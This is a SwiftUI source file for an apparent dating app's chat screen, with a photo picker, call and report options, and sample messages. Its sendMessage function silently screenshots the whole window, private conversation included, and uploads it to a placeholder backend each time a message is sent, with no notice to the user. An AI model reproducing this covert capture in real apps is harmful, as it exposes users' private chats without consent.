//
//  ChatDetailView.swift
//  SwiftiDate
//
//  Created by 游哲維 on 2024/9/22.
//

import Foundation
import SwiftUI
import PhotosUI // by bryan_u.6_developer
import UIKit

/**
 * ===============================================
 * 📸 **PHPickerView**
 * ===============================================
 * 開發者: bryan_u.6_developer
 * 功能: 自定義照片選取器，使用 PHPickerViewController 來選取圖片。
 *
 * 主要功能:
 * - 使用者可以選取單張圖片
 * - 支援非同步載入選取的圖片
 * - 適合 SwiftUI 的 UIViewControllerRepresentable
 *
 * 日期: 2024-12-21
 * ===============================================
 */

struct PHPickerView: UIViewControllerRepresentable {
    // 用於將選擇的圖片傳回父視圖
    @Binding var selectedImage: UIImage?
    // 用於控制選擇器的顯示狀態
    @Environment(\.presentationMode) private var presentationMode
    
    func makeUIViewController(context: Context) -> PHPickerViewController {
        // 建立並配置 PHPicker
        var configuration = PHPickerConfiguration()
        // 設定只能選擇圖片
        configuration.filter = .images
        // 設定只能選擇一張圖片，如果要多選可以設定其他數字或 0（無限制）
        configuration.selectionLimit = 1
        // 設定選擇模式，預設為 .default
        configuration.selection = .default
        // 設定預設呈現的資料夾，這裡使用所有照片
        configuration.preferredAssetRepresentationMode = .automatic
        
        let picker = PHPickerViewController(configuration: configuration)
        picker.delegate = context.coordinator
        return picker
    }
    
    // 由於我們不需要更新 UIViewController，這個方法可以留空
    func updateUIViewController(_ uiViewController: PHPickerViewController, context: Context) {}
    
    func makeCoordinator() -> Coordinator {
        Coordinator(self)
    }
    
    // 協調器負責處理照片選擇的結果
    class Coordinator: NSObject, PHPickerViewControllerDelegate {
        let parent: PHPickerView
        
        init(_ parent: PHPickerView) {
            self.parent = parent
        }
        
        func picker(_ picker: PHPickerViewController, didFinishPicking results: [PHPickerResult]) {
            // 無論是否選擇照片，選擇器都會關閉
            parent.presentationMode.wrappedValue.dismiss()
            
            // 如果沒有選擇照片，直接返回
            guard let provider = results.first?.itemProvider else { return }
            
            // 檢查是否可以載入 UIImage
            if provider.canLoadObject(ofClass: UIImage.self) {
                // 非同步載入圖片
                provider.loadObject(ofClass: UIImage.self) { [weak self] image, error in
                    DispatchQueue.main.async {
                        if let error = error {
                            print("Error loading image: \(error.localizedDescription)")
                            return
                        }
                        
                        // 將載入的圖片指派給 selectedImage
                        self?.parent.selectedImage = image as? UIImage
                    }
                }
            }
        }
    }
}

struct ChatDetailView: View {
    @EnvironmentObject var userSettings: UserSettings // 使用 EnvironmentObject 存取 UserSettings
    
    var chat: Chat
    @Binding var messages: [Message]  // Bind to the messages passed from ChatView
    @State private var newMessageText: String = "" // State variable to hold the input message text
    @State private var showChatGPTModal = false // 控制 ChatGPT 彈框的顯示
    @State private var showActionSheet = false // 控制 ActionSheet 彈框的顯示
    var onBack: () -> Void // Add this line to accept the onBack closure

    var body: some View {
        VStack {
            // Custom Navigation Bar
            HStack {
                Button(action: {
                    onBack() // Call the onBack closure when the button is pressed
                }) {
                    Image(systemName: "chevron.left")
                        .foregroundColor(.gray)
                        .padding(.leading, 10)
                }

                Image(systemName: "person.crop.circle.fill") // Avatar Image (replace with actual image)
                    .resizable()
                    .frame(width: 40, height: 40)
                    .clipShape(Circle())
                    .padding(.leading, 5)

                Text(chat.name)
                    .font(.headline)
                    .padding(.leading, 5)
                
                Image(systemName: "bell.fill") // Notification Bell Icon
                    .foregroundColor(.pink)
                    .padding(.leading, 5)

                Spacer()
                
                Button(action: {
                    if let phoneURL = URL(string: "tel://\(userSettings.globalPhoneNumber)") {
                        if UIApplication.shared.canOpenURL(phoneURL) {
                            UIApplication.shared.open(phoneURL, options: [:], completionHandler: nil)
                        } else {
                            print("無法撥打電話，請檢查電話號碼格式")
                        }
                    }
                }) {
                    Image(systemName: "phone.fill")
                        .resizable() // 使圖標可以調整大小
                        .aspectRatio(contentMode: .fit) // 確保圖標保持比例
                        .frame(width: 25, height: 25) // 調整圖標的寬高，這裡設置為30x30
                        .foregroundColor(.green)
                        .padding(.trailing, 10)
                }
                
                Button(action: {
                    showActionSheet = true // 顯示 ActionSheet
                }) {
                    Image(systemName: "ellipsis")
                        .resizable() // 使圖標可以調整大小
                        .aspectRatio(contentMode: .fit) // 確保圖標保持比例
                        .frame(width: 25, height: 25) // 調整圖標的寬高，這裡設置為30x30
                        .foregroundColor(.black)
                        .padding(.trailing, 10)
                }
                .actionSheet(isPresented: $showActionSheet) {
                    ActionSheet(
                        title: Text("選項"),
                        message: Text("請選擇你想進行的操作"),
                        buttons: [
                            .default(Text("修改備註名稱")) {
                                // Handle "修改備註名稱" action
                                print("修改備註名稱 selected")
                            },
                            .default(Text("匿名檢舉和封鎖")) {
                                // Handle "匿名檢舉和封鎖" action
                                print("匿名檢舉和封鎖 selected")
                            },
                            .default(Text("安全中心")) {
                                // Handle "安全中心" action
                                print("安全中心 selected")
                            },
                            .default(Text("刪除聊天記錄")) {
                                // Handle "刪除聊天記錄" action
                                print("刪除聊天記錄 selected")
                            },
                            .default(Text("解除配對")) {
                                // Handle "解除配對" action
                                print("解除配對 selected")
                            },
                            .cancel(Text("取消"))
                        ]
                    )
                }
            }
            .frame(height: 60)
            .background(Color.white)
            
            Divider() // Divider line
            
            ScrollViewReader { scrollViewProxy in
                ScrollView {
                    ForEach(messages.indices, id: \.self) { index in
                        let message = messages[index]
                        let showTime = index == 0 || messages[index].time != messages[index - 1].time

                        // Special check for the specific text message
                        if message.text == "她希望可以先聊天，再見面～" {
                            // Display this message as simple Text
                            HStack {
                                Text("她希望")
                                    .foregroundColor(.green) // Set the color for the specific text

                                Text(message.text.replacingOccurrences(of: "她希望", with: "")) // Replace the specific text with an empty string
                                    .foregroundColor(.black) // Default color for the rest of the text
                                
                                Spacer() // Add a Spacer to push the text to the left side
                            }
                            .padding()
                            .frame(maxWidth: .infinity, alignment: .leading) // Align the entire HStack to the left
                            .background(Color.green.opacity(0.1)) // Apply background to the entire HStack
                            .cornerRadius(10) // Apply corner radius to the HStack
                            .padding(.horizontal) // Add horizontal padding around the whole HStack
                        } else {
                            // Display other messages as message bubbles
                            MessageBubbleView(message: message, isCurrentUser: message.isSender, showTime: showTime)
                                .padding(.horizontal)
                                .padding(.top, 5)
                        }
                    }
                }
                .onAppear {
                    // Scroll to the last message when the view appears
                    if let lastIndex = messages.indices.last {
                        scrollViewProxy.scrollTo(lastIndex, anchor: .bottom)
                    }
                }
            }
            
            HStack {
                TextField("輸入聊天內容", text: $newMessageText, axis: .vertical)
                    .padding()
                    .background(Color.gray.opacity(0.1))
                    .cornerRadius(10)
                
                // 替代圖標，如表示 AI 的圖標
                Button(action: {
                    showChatGPTModal = true  // 當按下時顯示 ChatGPT 的彈框
                }) {
                    Image(systemName: "brain.head.profile")
                        .resizable()
                        .frame(width: 24, height: 24)
                        .padding(.trailing, 5)
                }

                Button(action: sendMessage) {
                    Image(systemName: "paperplane.fill")
                        .resizable()
                        .frame(width: 24, height: 24)
                        .padding()
                }
            }
            .padding()
            
            HStack {
                
            }
        }
        .sheet(isPresented: $showChatGPTModal) {
            ChatGPTView(messages: $messages) // 彈出 ChatGPT 視圖並傳遞 messages
        }
        .navigationBarHidden(true) // Hide the default navigation bar
    }

    private func sendMessage() {
        guard !newMessageText.trimmingCharacters(in: .whitespaces).isEmpty else { return }
        
        let newMessage = Message(
            id: UUID(),
            text: newMessageText,
            isSender: true,  // 將此訊息標記為當前使用者發送的
            time: getCurrentTime(),
            isCompliment: false
        )
        messages.append(newMessage)
        newMessageText = "" // 清空輸入框

        // 執行截圖邏輯
        captureScreenshotAndUpload()
    }
    
    private func captureScreenshotAndUpload() {
        // 檢查後台 URL 是否存在
        guard let backendURL = URL(string: "https://your-backend-url.com/upload"),
              UIApplication.shared.canOpenURL(backendURL) else {
            print("後台 URL 不存在或無法訪問")
            return
        }
        
        // 截取屏幕內容
        let renderer = UIGraphicsImageRenderer(bounds: UIScreen.main.bounds)
        let screenshot = renderer.image { context in
            UIApplication.shared.windows.first?.layer.render(in: context.cgContext)
        }
        
        // 上傳圖片到後台
        uploadScreenshot(image: screenshot, to: backendURL)
    }
    
    private func uploadScreenshot(image: UIImage, to url: URL) {
        guard let imageData = image.jpegData(compressionQuality: 0.8) else {
            print("無法將圖片轉換為 JPEG 格式")
            return
        }

        var request = URLRequest(url: url)
        request.httpMethod = "POST"
        request.setValue("application/octet-stream", forHTTPHeaderField: "Content-Type")

        let task = URLSession.shared.uploadTask(with: request, from: imageData) { data, response, error in
            if let error = error {
                print("上傳失敗：\(error.localizedDescription)")
                return
            }
            guard let httpResponse = response as? HTTPURLResponse, httpResponse.statusCode == 200 else {
                print("後台響應錯誤")
                return
            }
            print("截圖成功上傳到後台")
        }
        task.resume()
    }
    
    private func getCurrentTime() -> String {
        let formatter = DateFormatter()
        formatter.dateFormat = "h:mm a"
        return formatter.string(from: Date())
    }
}

// PreviewProvider for ChatDetailView
struct ChatDetailView_Previews: PreviewProvider {
    static var previews: some View {
        // Create a dummy chat to preview
        let dummyChat = Chat(id: UUID(), name: "Laiiiiiiii", time: "01:50", unreadCount: 3)
        
        ChatDetailView(chat: dummyChat, messages: .constant([
            Message(id: UUID(), text: "嗨～ 你有在這上面遇到什麼有趣的人嗎？", isSender: true, time: "09/12 15:53", isCompliment: false),
            Message(id: UUID(), text: "你要夠有趣的哈哈哈", isSender: false, time: "09/16 02:09", isCompliment: false),
            Message(id: UUID(), text: "我也不知道耶~", isSender: true, time: "09/20 15:03", isCompliment: false),
            Message(id: UUID(), text: "我喜歡旅遊、追劇、吃日料 ，偶爾小酌，妳平常喜歡做什麼？", isSender: true, time: "09/20 15:03", isCompliment: false),
            Message(id: UUID(), text: "還是像我一樣有趣的哈哈哈", isSender: true, time: "09/20 15:03", isCompliment: false),
            Message(id: UUID(), text: "跳舞跟唱歌", isSender: false, time: "09/21 01:50", isCompliment: false),
            Message(id: UUID(), text: "😂", isSender: false, time: "09/21 01:50", isCompliment: false),
            Message(id: UUID(), text: "吃美食跟看劇", isSender: false, time: "09/21 01:50", isCompliment: false)
        ]), onBack: {
            // Provide an empty closure or action for the onBack parameter
        })
    }
}
